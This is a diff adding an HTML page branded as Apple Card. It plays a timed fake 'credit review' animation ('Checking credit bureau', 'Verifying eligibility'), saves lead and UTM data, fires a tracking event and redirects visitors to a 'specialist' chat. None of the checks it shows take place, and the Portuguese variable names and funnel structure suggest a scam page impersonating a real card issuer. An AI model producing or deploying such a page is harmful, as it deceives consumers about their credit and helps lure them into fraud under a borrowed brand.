@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Reviewing — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-blue:#0071E3;--success:#34C759;--gray-400:#86868B;--gray-500:#6E6E73}
+
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:#1D1D1F;color:#fff;-webkit-font-smoothing:antialiased;overflow:hidden}
+        .page-wrapper{max-width:520px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;position:relative;overflow:hidden}
+
+        /* Background glow */
+        .bg-glow{position:absolute;width:300px;height:300px;border-radius:50%;filter:blur(80px);opacity:0.15;pointer-events:none}
+        .bg-glow.blue{background:var(--apple-blue);top:10%;left:-20%;animation:floatGlow 8s ease-in-out infinite}
+        .bg-glow.green{background:var(--success);bottom:10%;right:-20%;animation:floatGlow 8s ease-in-out infinite reverse}
+
+        /* Apple Logo Pulse */
+        .logo-container{margin-bottom:40px;position:relative}
+        .logo-ring{width:80px;height:80px;border-radius:50%;border:2px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;animation:pulseRing 2s ease-in-out infinite}
+        .logo-ring img{width:32px;height:38px;opacity:0.9}
+
+        /* Spinner */
+        .spinner-container{margin-bottom:32px;position:relative;width:56px;height:56px}
+        .spinner-track{width:56px;height:56px;border-radius:50%;border:2.5px solid rgba(255,255,255,0.08);position:absolute}
+        .spinner-fill{width:56px;height:56px;border-radius:50%;border:2.5px solid transparent;border-top-color:var(--apple-blue);position:absolute;animation:spin 1s linear infinite}
+
+        /* Status */
+        .status-text{font-size:1.125rem;font-weight:600;color:#fff;margin-bottom:8px;text-align:center;letter-spacing:-0.01em;min-height:28px}
+        .status-sub{font-size:0.8125rem;color:var(--gray-400);text-align:center;margin-bottom:40px}
+
+        /* Steps */
+        .steps{width:100%;max-width:320px;display:flex;flex-direction:column;gap:16px}
+        .step{display:flex;align-items:center;gap:14px;opacity:0.3;transition:all 0.5s ease}
+        .step.active{opacity:1}
+        .step.done{opacity:1}
+        .step-indicator{width:28px;height:28px;border-radius:50%;border:2px solid rgba(255,255,255,0.2);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.4s ease}
+        .step.active .step-indicator{border-color:var(--apple-blue);background:rgba(0,113,227,0.15)}
+        .step.active .step-indicator::after{content:'';width:6px;height:6px;border-radius:50%;background:var(--apple-blue);animation:dotPulse 1s ease-in-out infinite}
+        .step.done .step-indicator{border-color:var(--success);background:var(--success)}
+        .step.done .step-indicator::after{display:none}
+        .step.done .step-indicator svg{display:block}
+        .step-indicator svg{display:none;width:14px;height:14px;fill:#fff}
+        .step-label{font-size:0.875rem;font-weight:500;color:rgba(255,255,255,0.7);transition:color 0.4s ease}
+        .step.active .step-label{color:#fff}
+        .step.done .step-label{color:var(--success)}
+
+        /* Progress bar bottom */
+        .progress-bottom{position:absolute;bottom:0;left:0;right:0;height:3px;background:rgba(255,255,255,0.06)}
+        .progress-bottom-fill{height:100%;background:linear-gradient(90deg,var(--apple-blue),var(--success));width:0%;transition:width 0.5s ease}
+
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes pulseRing{0%,100%{transform:scale(1);border-color:rgba(255,255,255,0.1)}50%{transform:scale(1.05);border-color:rgba(255,255,255,0.2)}}
+        @keyframes dotPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
+        @keyframes floatGlow{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,-30px)}}
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <div class="bg-glow blue"></div>
+        <div class="bg-glow green"></div>
+
+        <div class="logo-container">
+            <div class="logo-ring">
+                <img src="assets/images/white.svg" alt="" style="width:40px;height:48px">
+            </div>
+        </div>
+
+        <div class="spinner-container">
+            <div class="spinner-track"></div>
+            <div class="spinner-fill"></div>
+        </div>
+
+        <div class="status-text" id="statusText">Analyzing data...</div>
+        <div class="status-sub" id="statusSub">Please wait while we process your request</div>
+
+        <div class="steps">
+            <div class="step" id="step1">
+                <div class="step-indicator"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
+                <span class="step-label">Checking credit bureau</span>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-indicator"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
+                <span class="step-label">Reviewing financial profile</span>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-indicator"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
+                <span class="step-label">Verifying eligibility</span>
+            </div>
+            <div class="step" id="step4">
+                <div class="step-indicator"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
+                <span class="step-label">Preparing your offer</span>
+            </div>
+        </div>
+
+        <div class="progress-bottom">
+            <div class="progress-bottom-fill" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        /* UTM */
+        (function(){ var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck']; var p=new URLSearchParams(window.location.search); u.forEach(function(k){ var v=p.get(k); if(v) localStorage.setItem(k,v); }); })();
+
+        const LeadData = {
+            _key: 'applecard_lead',
+            load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}'); } catch { return {}; } },
+            update(d) { const c=this.load(); const u={...c,...d,updated_at:Date.now()}; localStorage.setItem(this._key,JSON.stringify(u)); return u; }
+        };
+
+        function buildUrl(base, extra={}) {
+            const url=new URL(base,window.location.href);
+            new URLSearchParams(window.location.search).forEach((v,k)=>url.searchParams.set(k,v));
+            Object.entries(extra).forEach(([k,v])=>{if(v)url.searchParams.set(k,v);});
+            return url.toString();
+        }
+
+        const statusMessages = [
+            'Checking credit bureau...',
+            'Reviewing financial profile...',
+            'Verifying eligibility...',
+            'Preparing your personalized offer...',
+            'Almost done!'
+        ];
+
+        const steps = ['step1','step2','step3','step4'];
+        const timings = [2000, 2200, 2000, 1800];
+        let currentStep = 0;
+
+        function activateStep(idx) {
+            if (idx > 0) {
+                document.getElementById(steps[idx-1]).classList.remove('active');
+                document.getElementById(steps[idx-1]).classList.add('done');
+            }
+            if (idx < steps.length) {
+                document.getElementById(steps[idx]).classList.add('active');
+                document.getElementById('statusText').textContent = statusMessages[idx];
+                document.getElementById('progressBar').style.width = ((idx+1)/(steps.length))*100 + '%';
+            }
+        }
+
+        // Start sequence
+        setTimeout(() => activateStep(0), 300);
+        
+        let elapsed = 300;
+        timings.forEach((time, i) => {
+            elapsed += time;
+            setTimeout(() => {
+                if (i < steps.length - 1) {
+                    activateStep(i + 1);
+                } else {
+                    // Final step done
+                    document.getElementById(steps[i]).classList.remove('active');
+                    document.getElementById(steps[i]).classList.add('done');
+                    document.getElementById('statusText').textContent = 'Review complete!';
+                    document.getElementById('statusSub').textContent = 'Connecting you with your specialist...';
+                    document.getElementById('progressBar').style.width = '100%';
+
+                    const data = LeadData.load();
+                    LeadData.update({ analysis_completed: true, page: 'analise' });
+                    if (window.track) window.track('AnalysisCompleted', { value: data.limite_aprovado || 0, currency: 'USD', content_id: 'apple-card-us' });
+                    if (window.identifyUser) window.identifyUser();
+
+                    setTimeout(() => {
+                        window.location.href = buildUrl('chat.html');
+                    }, 1500);
+                }
+            }, elapsed);
+        });
+    </script>
+</body>
+</html>
